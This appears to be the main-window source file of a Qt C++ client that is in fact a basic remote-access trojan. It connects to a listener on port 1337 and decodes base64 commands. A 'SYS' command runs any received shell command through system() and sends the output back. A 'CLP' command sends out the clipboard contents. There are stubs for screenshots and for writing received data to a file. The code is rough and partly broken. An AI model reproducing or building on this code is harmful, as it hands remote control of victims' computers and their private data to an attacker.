#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <cstdlib>



MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->networdHandler = NIL;
    this->clientSocket = new QTcpSocket(this);
    this->clientSocket->connectToHost("127.0.0.1",1337);
    connect(clientSocket, &QAbstractSocket::readyRead, this, &MainWindow::read);
    QMimeData myMimeData;
    Screenshot *scshot = new Screenshot();

    /*while(true)
    {
        //QTest::qWait(1000);
        //usleep(10000);
        //qDebug() << "sleeping";
}
*/
//
}
void MainWindow::read(){
  QString returnStr = QByteArray::fromBase64(this->clientSocket->readAll());
  qDebug() << returnStr;
  qDebug() << "Received Data";
  if(returnStr.contains("CLP"))
  {
          MainWindow::sendCmd(this->clippy->getclipboardString());
}
  else if(returnStr.contains("SYS"))
  {
      returnStr.remove(0,4);
      system(qPrintable(returnStr + ">> command.txt"));
      qDebug() << returnStr;
      QFile *file = new QFile("command.txt");
      if(!file->open(QIODevice::ReadWrite))
      {
          qWarning("Couldn't save the file");
      }
      QTextStream in(file);
      QString output = in.readAll();
      typeid("typeid is" + returnStr);
      MainWindow::sendCmd(output);

  }
  switch (this->networdHandler) {
/*
    case SYS:
      {
        ClipboardWindow* c = new ClipboardWindow(this, returnStr);
        c->show();
        break;
      }
      */
    case CLP:
      {
        MainWindow::sendCmd(this->clippy->getclipboardString());
        break;
      }

    case EXT:
      {
        QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
        QFile *saveFile = new QFile(fileName);
        if (!saveFile->open(QIODevice::WriteOnly)) {
            qWarning("Couldn't open save file.");
            return;
        }
        saveFile->write(returnStr.toUtf8());
        break;
      }
    case SCR:
      QMessageBox::information(this, "Serbian Command", "Not implemented yet");
      break;
    default:
      qDebug() << "Received unwanted response: " + returnStr;
      break;
  }

  this->networdHandler = NIL;
}
void MainWindow::sendCmd(QString cmd){
  this->clientSocket->write((cmd + "\n").toUtf8().toBase64());
  this->clientSocket->flush();
}
MainWindow::~MainWindow()
{
    delete ui;
}

